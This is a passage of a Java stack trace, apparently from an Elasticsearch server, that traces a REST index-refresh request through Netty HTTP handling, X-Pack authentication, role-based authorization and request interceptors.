       org.elasticsearch.xpack.security.authz.AuthorizationService$$Lambda$5198/0x0000000801826938.getAsync(Unknown Source)
       org.elasticsearch.xpack.security.authz.AuthorizationService$CachingAsyncSupplier.getAsync(AuthorizationService.java:676)
       org.elasticsearch.xpack.security.authz.RBACEngine.lambda$authorizeIndexAction$4(RBACEngine.java:313)
       org.elasticsearch.xpack.security.authz.RBACEngine$$Lambda$5201/0x0000000801826fd0.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       org.elasticsearch.xpack.security.authz.RBACEngine.authorizeIndexActionName(RBACEngine.java:337)
       org.elasticsearch.xpack.security.authz.RBACEngine.authorizeIndexAction(RBACEngine.java:310)
       org.elasticsearch.xpack.security.authz.AuthorizationService.authorizeAction(AuthorizationService.java:283)
       org.elasticsearch.xpack.security.authz.AuthorizationService.maybeAuthorizeRunAs(AuthorizationService.java:248)
       org.elasticsearch.xpack.security.authz.AuthorizationService.lambda$authorize$1(AuthorizationService.java:212)
       org.elasticsearch.xpack.security.authz.AuthorizationService$$Lambda$4866/0x0000000801607af8.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       app//org.elasticsearch.action.support.ContextPreservingActionListener.onResponse(ContextPreservingActionListener.java:43)
       org.elasticsearch.xpack.security.authz.RBACEngine.lambda$resolveAuthorizationInfo$1(RBACEngine.java:123)
       org.elasticsearch.xpack.security.authz.RBACEngine$$Lambda$4868/0x00000008017d0040.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       org.elasticsearch.xpack.security.authz.store.CompositeRolesStore.getRoles(CompositeRolesStore.java:274)
       org.elasticsearch.xpack.security.authz.RBACEngine.getRoles(RBACEngine.java:129)
       org.elasticsearch.xpack.security.authz.RBACEngine.resolveAuthorizationInfo(RBACEngine.java:117)
       org.elasticsearch.xpack.security.authz.AuthorizationService.authorize(AuthorizationService.java:214)
       org.elasticsearch.xpack.security.action.filter.SecurityActionFilter.authorizeRequest(SecurityActionFilter.java:173)
       org.elasticsearch.xpack.security.action.filter.SecurityActionFilter.lambda$applyInternal$3(SecurityActionFilter.java:159)
       org.elasticsearch.xpack.security.action.filter.SecurityActionFilter$$Lambda$4862/0x0000000801607238.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lambda$authenticateAsync$2(AuthenticationService.java:323)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator$$Lambda$4765/0x0000000801605bb8.accept(Unknown Source)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lambda$lookForExistingAuthentication$6(AuthenticationService.java:384)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator$$Lambda$4766/0x0000000801605df0.run(Unknown Source)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lookForExistingAuthentication(AuthenticationService.java:395)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.authenticateAsync(AuthenticationService.java:320)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.access$000(AuthenticationService.java:261)
       org.elasticsearch.xpack.security.authc.AuthenticationService.authenticate(AuthenticationService.java:156)
       org.elasticsearch.xpack.security.action.filter.SecurityActionFilter.applyInternal(SecurityActionFilter.java:156)
       org.elasticsearch.xpack.security.action.filter.SecurityActionFilter.apply(SecurityActionFilter.java:108)
       app//org.elasticsearch.action.support.TransportAction$RequestFilterChain.proceed(TransportAction.java:177)
       app//org.elasticsearch.action.support.TransportAction.execute(TransportAction.java:155)
       app//org.elasticsearch.action.support.TransportAction.execute(TransportAction.java:83)
       app//org.elasticsearch.action.support.replication.TransportBroadcastReplicationAction.shardExecute(TransportBroadcastReplicationAction.java:118)
       app//org.elasticsearch.action.support.replication.TransportBroadcastReplicationAction.doExecute(TransportBroadcastReplicationAction.java:111)
       app//org.elasticsearch.action.support.replication.TransportBroadcastReplicationAction.doExecute(TransportBroadcastReplicationAction.java:52)
       app//org.elasticsearch.action.support.TransportAction$RequestFilterChain.proceed(TransportAction.java:179)
       app//org.elasticsearch.action.support.ActionFilter$Simple.apply(ActionFilter.java:53)
       app//org.elasticsearch.action.support.TransportAction$RequestFilterChain.proceed(TransportAction.java:177)
       org.elasticsearch.xpack.security.action.filter.SecurityActionFilter.lambda$apply$0(SecurityActionFilter.java:87)
       org.elasticsearch.xpack.security.action.filter.SecurityActionFilter$$Lambda$4859/0x0000000801606ba0.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       org.elasticsearch.xpack.security.action.filter.SecurityActionFilter.lambda$authorizeRequest$4(SecurityActionFilter.java:173)
       org.elasticsearch.xpack.security.action.filter.SecurityActionFilter$$Lambda$4864/0x0000000801607698.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       org.elasticsearch.xpack.security.authz.AuthorizationService.lambda$runRequestInterceptors$15(AuthorizationService.java:365)
       org.elasticsearch.xpack.security.authz.AuthorizationService$$Lambda$5216/0x00000008018386d8.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture$1.doRun(ListenableFuture.java:112)
       app//org.elasticsearch.common.util.concurrent.AbstractRunnable.run(AbstractRunnable.java:37)
       app//org.elasticsearch.common.util.concurrent.EsExecutors$DirectExecutorService.execute(EsExecutors.java:226)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture.notifyListener(ListenableFuture.java:106)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture.lambda$done$0(ListenableFuture.java:98)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture$$Lambda$4740/0x0000000801759ad8.accept(Unknown Source)
       java.base@15/java.util.ArrayList.forEach(ArrayList.java:1511)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture.done(ListenableFuture.java:98)
       app//org.elasticsearch.common.util.concurrent.BaseFuture.set(BaseFuture.java:144)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture.onResponse(ListenableFuture.java:127)
       app//org.elasticsearch.action.StepListener.innerOnResponse(StepListener.java:62)
       app//org.elasticsearch.action.NotifyOnceListener.onResponse(NotifyOnceListener.java:40)
       org.elasticsearch.xpack.security.authz.interceptor.FieldAndDocumentLevelSecurityRequestInterceptor.intercept(FieldAndDocumentLevelSecurityRequestInterceptor.java:65)
       org.elasticsearch.xpack.security.authz.interceptor.SearchRequestInterceptor.intercept(SearchRequestInterceptor.java:19)
       org.elasticsearch.xpack.security.authz.AuthorizationService.lambda$runRequestInterceptors$14(AuthorizationService.java:360)
       org.elasticsearch.xpack.security.authz.AuthorizationService$$Lambda$5214/0x0000000801838278.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture$1.doRun(ListenableFuture.java:112)
       app//org.elasticsearch.common.util.concurrent.AbstractRunnable.run(AbstractRunnable.java:37)
       app//org.elasticsearch.common.util.concurrent.EsExecutors$DirectExecutorService.execute(EsExecutors.java:226)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture.notifyListener(ListenableFuture.java:106)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture.lambda$done$0(ListenableFuture.java:98)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture$$Lambda$4740/0x0000000801759ad8.accept(Unknown Source)
       java.base@15/java.util.ArrayList.forEach(ArrayList.java:1511)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture.done(ListenableFuture.java:98)
       app//org.elasticsearch.common.util.concurrent.BaseFuture.set(BaseFuture.java:144)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture.onResponse(ListenableFuture.java:127)
       app//org.elasticsearch.action.StepListener.innerOnResponse(StepListener.java:62)
       app//org.elasticsearch.action.NotifyOnceListener.onResponse(NotifyOnceListener.java:40)
       org.elasticsearch.xpack.security.authz.interceptor.BulkShardRequestInterceptor.intercept(BulkShardRequestInterceptor.java:75)
       org.elasticsearch.xpack.security.authz.AuthorizationService.lambda$runRequestInterceptors$14(AuthorizationService.java:360)
       org.elasticsearch.xpack.security.authz.AuthorizationService$$Lambda$5214/0x0000000801838278.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture$1.doRun(ListenableFuture.java:112)
       app//org.elasticsearch.common.util.concurrent.AbstractRunnable.run(AbstractRunnable.java:37)
       app//org.elasticsearch.common.util.concurrent.EsExecutors$DirectExecutorService.execute(EsExecutors.java:226)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture.notifyListener(ListenableFuture.java:106)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture.lambda$done$0(ListenableFuture.java:98)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture$$Lambda$4740/0x0000000801759ad8.accept(Unknown Source)
       java.base@15/java.util.ArrayList.forEach(ArrayList.java:1511)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture.done(ListenableFuture.java:98)
       app//org.elasticsearch.common.util.concurrent.BaseFuture.set(BaseFuture.java:144)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture.onResponse(ListenableFuture.java:127)
       app//org.elasticsearch.action.StepListener.innerOnResponse(StepListener.java:62)
       app//org.elasticsearch.action.NotifyOnceListener.onResponse(NotifyOnceListener.java:40)
       org.elasticsearch.xpack.security.authz.interceptor.FieldAndDocumentLevelSecurityRequestInterceptor.intercept(FieldAndDocumentLevelSecurityRequestInterceptor.java:65)
       org.elasticsearch.xpack.security.authz.interceptor.UpdateRequestInterceptor.intercept(UpdateRequestInterceptor.java:23)
       org.elasticsearch.xpack.security.authz.AuthorizationService.lambda$runRequestInterceptors$14(AuthorizationService.java:360)
       org.elasticsearch.xpack.security.authz.AuthorizationService$$Lambda$5214/0x0000000801838278.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture$1.doRun(ListenableFuture.java:112)
       app//org.elasticsearch.common.util.concurrent.AbstractRunnable.run(AbstractRunnable.java:37)
       app//org.elasticsearch.common.util.concurrent.EsExecutors$DirectExecutorService.execute(EsExecutors.java:226)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture.notifyListener(ListenableFuture.java:106)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture.lambda$done$0(ListenableFuture.java:98)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture$$Lambda$4740/0x0000000801759ad8.accept(Unknown Source)
       java.base@15/java.util.ArrayList.forEach(ArrayList.java:1511)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture.done(ListenableFuture.java:98)
       app//org.elasticsearch.common.util.concurrent.BaseFuture.set(BaseFuture.java:144)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture.onResponse(ListenableFuture.java:127)
       app//org.elasticsearch.action.StepListener.innerOnResponse(StepListener.java:62)
       app//org.elasticsearch.action.NotifyOnceListener.onResponse(NotifyOnceListener.java:40)
       org.elasticsearch.xpack.security.authz.interceptor.IndicesAliasesRequestInterceptor.intercept(IndicesAliasesRequestInterceptor.java:106)
       org.elasticsearch.xpack.security.authz.AuthorizationService.lambda$runRequestInterceptors$14(AuthorizationService.java:360)
       org.elasticsearch.xpack.security.authz.AuthorizationService$$Lambda$5214/0x0000000801838278.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture$1.doRun(ListenableFuture.java:112)
       app//org.elasticsearch.common.util.concurrent.AbstractRunnable.run(AbstractRunnable.java:37)
       app//org.elasticsearch.common.util.concurrent.EsExecutors$DirectExecutorService.execute(EsExecutors.java:226)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture.notifyListener(ListenableFuture.java:106)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture.lambda$done$0(ListenableFuture.java:98)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture$$Lambda$4740/0x0000000801759ad8.accept(Unknown Source)
       java.base@15/java.util.ArrayList.forEach(ArrayList.java:1511)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture.done(ListenableFuture.java:98)
       app//org.elasticsearch.common.util.concurrent.BaseFuture.set(BaseFuture.java:144)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture.onResponse(ListenableFuture.java:127)
       app//org.elasticsearch.action.StepListener.innerOnResponse(StepListener.java:62)
       app//org.elasticsearch.action.NotifyOnceListener.onResponse(NotifyOnceListener.java:40)
       org.elasticsearch.xpack.security.authz.interceptor.ResizeRequestInterceptor.intercept(ResizeRequestInterceptor.java:86)
       org.elasticsearch.xpack.security.authz.AuthorizationService.runRequestInterceptors(AuthorizationService.java:366)
       org.elasticsearch.xpack.security.authz.AuthorizationService.handleIndexActionAuthorizationResult(AuthorizationService.java:343)
       org.elasticsearch.xpack.security.authz.AuthorizationService.lambda$authorizeAction$9(AuthorizationService.java:285)
       org.elasticsearch.xpack.security.authz.AuthorizationService$$Lambda$5199/0x0000000801826b60.accept(Unknown Source)
       org.elasticsearch.xpack.security.authz.AuthorizationService$AuthorizationResultListener.onResponse(AuthorizationService.java:641)
       org.elasticsearch.xpack.security.authz.AuthorizationService$AuthorizationResultListener.onResponse(AuthorizationService.java:616)
       app//org.elasticsearch.action.support.ContextPreservingActionListener.onResponse(ContextPreservingActionListener.java:43)
       org.elasticsearch.xpack.security.authz.RBACEngine.buildIndicesAccessControl(RBACEngine.java:541)
       org.elasticsearch.xpack.security.authz.RBACEngine.lambda$authorizeIndexAction$3(RBACEngine.java:321)
       org.elasticsearch.xpack.security.authz.RBACEngine$$Lambda$5203/0x0000000801827430.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       org.elasticsearch.xpack.security.authz.AuthorizationService$CachingAsyncSupplier.lambda$getAsync$0(AuthorizationService.java:678)
       org.elasticsearch.xpack.security.authz.AuthorizationService$CachingAsyncSupplier$$Lambda$5205/0x0000000801827890.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       org.elasticsearch.xpack.security.authz.AuthorizationService.resolveIndexNames(AuthorizationService.java:579)
       org.elasticsearch.xpack.security.authz.AuthorizationService.lambda$authorizeAction$6(AuthorizationService.java:273)
       org.elasticsearch.xpack.security.authz.AuthorizationService$$Lambda$5207/0x0000000801827cf0.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       org.elasticsearch.xpack.security.authz.AuthorizationService$CachingAsyncSupplier.lambda$getAsync$0(AuthorizationService.java:678)
       org.elasticsearch.xpack.security.authz.AuthorizationService$CachingAsyncSupplier$$Lambda$5205/0x0000000801827890.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       org.elasticsearch.xpack.security.authz.RBACEngine.loadAuthorizedIndices(RBACEngine.java:352)
       org.elasticsearch.xpack.security.authz.AuthorizationService.lambda$authorizeAction$5(AuthorizationService.java:269)
       org.elasticsearch.xpack.security.authz.AuthorizationService$$Lambda$5197/0x0000000801826710.getAsync(Unknown Source)
       org.elasticsearch.xpack.security.authz.AuthorizationService$CachingAsyncSupplier.getAsync(AuthorizationService.java:676)
       org.elasticsearch.xpack.security.authz.AuthorizationService.lambda$authorizeAction$8(AuthorizationService.java:272)
       org.elasticsearch.xpack.security.authz.AuthorizationService$$Lambda$5198/0x0000000801826938.getAsync(Unknown Source)
       org.elasticsearch.xpack.security.authz.AuthorizationService$CachingAsyncSupplier.getAsync(AuthorizationService.java:676)
       org.elasticsearch.xpack.security.authz.RBACEngine.lambda$authorizeIndexAction$4(RBACEngine.java:313)
       org.elasticsearch.xpack.security.authz.RBACEngine$$Lambda$5201/0x0000000801826fd0.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       org.elasticsearch.xpack.security.authz.RBACEngine.authorizeIndexActionName(RBACEngine.java:337)
       org.elasticsearch.xpack.security.authz.RBACEngine.authorizeIndexAction(RBACEngine.java:310)
       org.elasticsearch.xpack.security.authz.AuthorizationService.authorizeAction(AuthorizationService.java:283)
       org.elasticsearch.xpack.security.authz.AuthorizationService.maybeAuthorizeRunAs(AuthorizationService.java:248)
       org.elasticsearch.xpack.security.authz.AuthorizationService.lambda$authorize$1(AuthorizationService.java:212)
       org.elasticsearch.xpack.security.authz.AuthorizationService$$Lambda$4866/0x0000000801607af8.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       app//org.elasticsearch.action.support.ContextPreservingActionListener.onResponse(ContextPreservingActionListener.java:43)
       org.elasticsearch.xpack.security.authz.RBACEngine.lambda$resolveAuthorizationInfo$1(RBACEngine.java:123)
       org.elasticsearch.xpack.security.authz.RBACEngine$$Lambda$4868/0x00000008017d0040.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       org.elasticsearch.xpack.security.authz.store.CompositeRolesStore.getRoles(CompositeRolesStore.java:274)
       org.elasticsearch.xpack.security.authz.RBACEngine.getRoles(RBACEngine.java:129)
       org.elasticsearch.xpack.security.authz.RBACEngine.resolveAuthorizationInfo(RBACEngine.java:117)
       org.elasticsearch.xpack.security.authz.AuthorizationService.authorize(AuthorizationService.java:214)
       org.elasticsearch.xpack.security.action.filter.SecurityActionFilter.authorizeRequest(SecurityActionFilter.java:173)
       org.elasticsearch.xpack.security.action.filter.SecurityActionFilter.lambda$applyInternal$3(SecurityActionFilter.java:159)
       org.elasticsearch.xpack.security.action.filter.SecurityActionFilter$$Lambda$4862/0x0000000801607238.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lambda$authenticateAsync$2(AuthenticationService.java:323)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator$$Lambda$4765/0x0000000801605bb8.accept(Unknown Source)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lambda$lookForExistingAuthentication$6(AuthenticationService.java:384)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator$$Lambda$4766/0x0000000801605df0.run(Unknown Source)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lookForExistingAuthentication(AuthenticationService.java:395)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.authenticateAsync(AuthenticationService.java:320)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.access$000(AuthenticationService.java:261)
       org.elasticsearch.xpack.security.authc.AuthenticationService.authenticate(AuthenticationService.java:156)
       org.elasticsearch.xpack.security.action.filter.SecurityActionFilter.applyInternal(SecurityActionFilter.java:156)
       org.elasticsearch.xpack.security.action.filter.SecurityActionFilter.apply(SecurityActionFilter.java:108)
       app//org.elasticsearch.action.support.TransportAction$RequestFilterChain.proceed(TransportAction.java:177)
       app//org.elasticsearch.action.support.TransportAction.execute(TransportAction.java:155)
       app//org.elasticsearch.action.support.TransportAction.execute(TransportAction.java:83)
       app//org.elasticsearch.client.node.NodeClient.executeLocally(NodeClient.java:83)
       app//org.elasticsearch.client.node.NodeClient.doExecute(NodeClient.java:72)
       app//org.elasticsearch.client.support.AbstractClient.execute(AbstractClient.java:409)
       app//org.elasticsearch.client.support.AbstractClient$IndicesAdmin.execute(AbstractClient.java:1274)
       app//org.elasticsearch.client.support.AbstractClient$IndicesAdmin.refresh(AbstractClient.java:1585)
       app//org.elasticsearch.rest.action.admin.indices.RestRefreshAction.lambda$prepareRequest$0(RestRefreshAction.java:60)
       app//org.elasticsearch.rest.action.admin.indices.RestRefreshAction$$Lambda$6003/0x000000080192ed78.accept(Unknown Source)
       app//org.elasticsearch.rest.BaseRestHandler.handleRequest(BaseRestHandler.java:115)
       org.elasticsearch.xpack.security.rest.SecurityRestFilter.lambda$handleRequest$0(SecurityRestFilter.java:76)
       org.elasticsearch.xpack.security.rest.SecurityRestFilter$$Lambda$5235/0x000000080183abe0.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       org.elasticsearch.xpack.security.authc.support.SecondaryAuthenticator.lambda$authenticateAndAttachToContext$2(SecondaryAuthenticator.java:82)
       org.elasticsearch.xpack.security.authc.support.SecondaryAuthenticator$$Lambda$5259/0x000000080183e090.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       org.elasticsearch.xpack.security.authc.support.SecondaryAuthenticator.authenticate(SecondaryAuthenticator.java:92)
       org.elasticsearch.xpack.security.authc.support.SecondaryAuthenticator.authenticateAndAttachToContext(SecondaryAuthenticator.java:77)
       org.elasticsearch.xpack.security.rest.SecurityRestFilter.lambda$handleRequest$2(SecurityRestFilter.java:70)
       org.elasticsearch.xpack.security.rest.SecurityRestFilter$$Lambda$5087/0x00000008017d7498.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lambda$writeAuthToContext$24(AuthenticationService.java:680)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator$$Lambda$5234/0x000000080183a9b8.run(Unknown Source)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.writeAuthToContext(AuthenticationService.java:695)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.finishAuthentication(AuthenticationService.java:669)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.consumeUser(AuthenticationService.java:616)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lambda$consumeToken$16(AuthenticationService.java:493)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator$$Lambda$5137/0x000000080181e560.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       app//org.elasticsearch.action.support.ContextPreservingActionListener.onResponse(ContextPreservingActionListener.java:43)
       org.elasticsearch.xpack.core.common.IteratingActionListener.onResponse(IteratingActionListener.java:120)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lambda$consumeToken$13(AuthenticationService.java:459)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator$$Lambda$5152/0x000000080181f6e0.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       org.elasticsearch.xpack.security.authc.support.CachingUsernamePasswordRealm.lambda$authenticateWithCache$1(CachingUsernamePasswordRealm.java:146)
       org.elasticsearch.xpack.security.authc.support.CachingUsernamePasswordRealm$$Lambda$5225/0x0000000801838f88.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       org.elasticsearch.xpack.security.authc.support.CachingUsernamePasswordRealm.handleCachedAuthentication(CachingUsernamePasswordRealm.java:197)
       org.elasticsearch.xpack.security.authc.support.CachingUsernamePasswordRealm.lambda$authenticateWithCache$2(CachingUsernamePasswordRealm.java:138)
       org.elasticsearch.xpack.security.authc.support.CachingUsernamePasswordRealm$$Lambda$5176/0x0000000801823490.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture$1.doRun(ListenableFuture.java:112)
       app//org.elasticsearch.common.util.concurrent.AbstractRunnable.run(AbstractRunnable.java:37)
       app//org.elasticsearch.common.util.concurrent.EsExecutors$DirectExecutorService.execute(EsExecutors.java:226)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture.notifyListener(ListenableFuture.java:106)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture.addListener(ListenableFuture.java:68)
       org.elasticsearch.xpack.security.authc.support.CachingUsernamePasswordRealm.authenticateWithCache(CachingUsernamePasswordRealm.java:133)
       org.elasticsearch.xpack.security.authc.support.CachingUsernamePasswordRealm.authenticate(CachingUsernamePasswordRealm.java:104)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lambda$consumeToken$15(AuthenticationService.java:448)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator$$Lambda$5133/0x000000080181dc60.accept(Unknown Source)
       org.elasticsearch.xpack.core.common.IteratingActionListener.run(IteratingActionListener.java:102)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.consumeToken(AuthenticationService.java:503)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator$$Lambda$5130/0x000000080181d5d8.accept(Unknown Source)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lambda$extractToken$11(AuthenticationService.java:415)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator$$Lambda$5132/0x000000080181da38.run(Unknown Source)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.extractToken(AuthenticationService.java:425)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lambda$checkForApiKey$3(AuthenticationService.java:366)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator$$Lambda$5116/0x000000080181b4f0.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       org.elasticsearch.xpack.security.authc.ApiKeyService.authenticateWithApiKeyIfPresent(ApiKeyService.java:342)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.checkForApiKey(AuthenticationService.java:347)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lambda$authenticateAsync$0(AuthenticationService.java:329)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator$$Lambda$5105/0x0000000801819878.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       org.elasticsearch.xpack.security.authc.TokenService.getAndValidateToken(TokenService.java:388)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lambda$authenticateAsync$2(AuthenticationService.java:325)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator$$Lambda$4765/0x0000000801605bb8.accept(Unknown Source)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lambda$lookForExistingAuthentication$6(AuthenticationService.java:384)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator$$Lambda$4766/0x0000000801605df0.run(Unknown Source)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lookForExistingAuthentication(AuthenticationService.java:395)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.authenticateAsync(AuthenticationService.java:320)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.access$000(AuthenticationService.java:261)
       org.elasticsearch.xpack.security.authc.AuthenticationService.authenticate(AuthenticationService.java:141)
       org.elasticsearch.xpack.security.authc.AuthenticationService.authenticate(AuthenticationService.java:126)
       org.elasticsearch.xpack.security.rest.SecurityRestFilter.handleRequest(SecurityRestFilter.java:63)
       app//org.elasticsearch.rest.RestController.dispatchRequest(RestController.java:236)
       app//org.elasticsearch.rest.RestController.tryAllHandlers(RestController.java:318)
       app//org.elasticsearch.rest.RestController.dispatchRequest(RestController.java:176)
       app//org.elasticsearch.http.AbstractHttpServerTransport.dispatchRequest(AbstractHttpServerTransport.java:318)
       app//org.elasticsearch.http.AbstractHttpServerTransport.handleIncomingRequest(AbstractHttpServerTransport.java:372)
       app//org.elasticsearch.http.AbstractHttpServerTransport.incomingRequest(AbstractHttpServerTransport.java:308)
       org.elasticsearch.http.netty4.Netty4HttpRequestHandler.channelRead0(Netty4HttpRequestHandler.java:42)
       org.elasticsearch.http.netty4.Netty4HttpRequestHandler.channelRead0(Netty4HttpRequestHandler.java:28)
       io.netty.channel.SimpleChannelInboundHandler.channelRead(SimpleChannelInboundHandler.java:99)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:379)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:365)
       io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:357)
       org.elasticsearch.http.netty4.Netty4HttpPipeliningHandler.channelRead(Netty4HttpPipeliningHandler.java:58)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:379)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:365)
       io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:357)
       io.netty.handler.codec.MessageToMessageDecoder.channelRead(MessageToMessageDecoder.java:103)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:379)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:365)
       io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:357)
       io.netty.handler.codec.MessageToMessageDecoder.channelRead(MessageToMessageDecoder.java:103)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:379)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:365)
       io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:357)
       io.netty.handler.codec.MessageToMessageDecoder.channelRead(MessageToMessageDecoder.java:103)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:379)
